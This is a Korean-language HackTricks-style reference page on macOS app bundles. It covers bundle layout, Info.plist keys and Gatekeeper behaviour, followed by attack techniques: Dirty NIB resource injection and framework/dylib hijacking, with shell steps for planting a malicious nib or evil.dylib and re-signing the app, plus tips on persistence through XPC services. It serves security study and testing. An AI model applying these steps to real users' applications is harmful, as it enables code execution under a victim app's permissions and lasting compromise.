# macOS 번들

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

macOS의 번들은 애플리케이션, 라이브러리 및 기타 필요한 파일을 포함한 다양한 리소스의 컨테이너 역할을 하며 Finder에서 단일 객체로 표시됩니다(예: 익숙한 `*.app` 파일). 가장 흔히 접하는 번들은 `.app` 번들이지만, `.framework`, `.systemextension`, `.kext` 같은 다른 유형도 널리 사용됩니다.

### 번들의 필수 구성요소

번들, 특히 `<application>.app/Contents/` 디렉토리에는 다양한 중요한 리소스가 포함됩니다:

- **\_CodeSignature**: 이 디렉토리는 애플리케이션 무결성 검증에 중요한 코드 서명 정보를 저장합니다. 다음과 같은 명령어로 코드 서명 정보를 확인할 수 있습니다:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: 사용자 상호작용 시 실행되는 애플리케이션의 실행 바이너리를 포함합니다.
- **Resources**: 이미지, 문서, 인터페이스 설명(nib/xib 파일) 등 애플리케이션의 사용자 인터페이스 구성 요소를 저장하는 저장소입니다.
- **Info.plist**: 애플리케이션의 주요 구성 파일로, 시스템이 애플리케이션을 적절히 인식하고 상호작용하기 위해 중요합니다.

#### Info.plist의 중요 키

`Info.plist` 파일은 애플리케이션 구성의 핵심으로, 다음과 같은 키를 포함합니다:

- **CFBundleExecutable**: `Contents/MacOS` 디렉터리에 있는 주요 실행 파일의 이름을 지정합니다.
- **CFBundleIdentifier**: 애플리케이션에 대한 전역 식별자를 제공하며, macOS에서 애플리케이션 관리를 위해 널리 사용됩니다.
- **LSMinimumSystemVersion**: 애플리케이션 실행에 필요한 최소 macOS 버전을 나타냅니다.

### 번들 탐색

예를 들어 `Safari.app` 같은 번들의 내용을 탐색하려면 다음 명령을 사용할 수 있습니다: `bash ls -lR /Applications/Safari.app/Contents`

이 탐색을 통해 `_CodeSignature`, `MacOS`, `Resources` 같은 디렉터리와 `Info.plist` 같은 파일이 표시되며, 각각은 애플리케이션을 보호하거나 사용자 인터페이스 및 동작 매개변수를 정의하는 등 고유한 역할을 합니다.

#### 추가 번들 디렉터리

일반 디렉터리 외에도 번들은 다음을 포함할 수 있습니다:

- **Frameworks**: 애플리케이션에서 사용하는 번들된 framework를 포함합니다. Framework는 추가 리소스를 가진 dylib와 유사합니다.
- **PlugIns**: 애플리케이션의 기능을 확장하는 플러그인 및 확장 기능을 위한 디렉터리입니다.
- **XPCServices**: 애플리케이션이 프로세스 외 통신을 위해 사용하는 XPC 서비스를 저장합니다.

이 구조는 필요한 모든 구성 요소가 번들 내에 캡슐화되도록 하여 모듈식이고 안전한 애플리케이션 환경을 조성합니다.

`Info.plist` 키와 그 의미에 대한 자세한 정보는 Apple 개발자 문서에서 확인할 수 있습니다: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## 보안 노트 및 악용 벡터

- **Gatekeeper / App Translocation**: 격리된 번들이 처음 실행될 때 macOS는 심층 서명 검증을 수행하고 무작위로 translocated된 경로에서 실행할 수 있습니다. 일단 수용되면 이후 실행에서는 얕은 검사만 수행되었고, 과거에는 `Resources/`, `PlugIns/`, nib 등 리소스 파일이 검사되지 않았습니다. macOS 13 Ventura부터는 첫 실행에서 심층 검사가 강제되며 새로운 *App Management* TCC 권한은 사용자 동의 없이 제3자 프로세스가 다른 번들을 수정하는 것을 제한하지만, 구형 시스템은 여전히 취약합니다.
- **Bundle Identifier collisions**: 여러 임베디드 대상(PlugIns, helper tools)이 동일한 `CFBundleIdentifier`를 재사용하면 서명 검증이 깨질 수 있으며, 때로는 URL‑scheme hijacking/confusion을 가능하게 할 수 있습니다. 항상 서브 번들을 나열하고 고유한 ID를 확인하세요.

## 리소스 하이재킹 (Dirty NIB / NIB Injection)

Ventura 이전에는 서명된 앱에서 UI 리소스를 교체하면 얕은 코드 서명을 우회해 앱의 entitlements로 코드 실행을 얻을 수 있었습니다. 최신 연구(2024)에 따르면 이는 여전히 pre‑Ventura 및 격리되지 않은 빌드에서 작동합니다:

1. 대상 앱을 쓰기 가능한 위치(예: `/tmp/Victim.app`)로 복사합니다.
2. `Contents/Resources/MainMenu.nib`(또는 `NSMainNibFile`에 선언된 다른 nib)을 `NSAppleScript`, `NSTask` 등을 인스턴스화하는 악성 nib로 교체합니다.
3. 앱을 실행합니다. 악성 nib은 피해자의 번들 ID 및 entitlements(TCC 권한, 마이크/카메라 등)로 실행됩니다.
4. Ventura+에서는 첫 실행 시 번들에 대한 심층 검증을 수행하고 이후 수정을 위해 *App Management* 권한을 요구함으로써 이를 완화합니다. 따라서 지속성 확보가 더 어려워졌지만, 구형 macOS에서는 초기 실행 공격이 여전히 유효합니다.

최소 악성 nib 페이로드 예시 (`ibtool`로 xib를 nib으로 컴파일):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## 번들 내부의 Framework / PlugIn / dylib Hijacking

`@rpath` 조회는 번들된 Frameworks/PlugIns를 우선하므로, 악성 라이브러리를 `Contents/Frameworks/` 또는 `Contents/PlugIns/`에 넣으면 메인 바이너리가 library validation 없이 서명되었거나 약한 `LC_RPATH` 정렬을 사용하는 경우 로드 순서를 바꿀 수 있습니다.

서명되지 않은/ad‑hoc 번들을 악용할 때의 일반적인 단계:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
참고:
- Hardened runtime에서 `com.apple.security.cs.disable-library-validation`이 없으면 서드파티 dylibs가 차단됩니다; 먼저 entitlements를 확인하세요.
- `Contents/XPCServices/` 아래의 XPC services는 종종 sibling frameworks를 로드합니다—해당 binaries를 persistence 또는 privilege escalation 경로를 위해 유사하게 패치하세요.

## 빠른 검사 치트시트
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 참고 자료

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
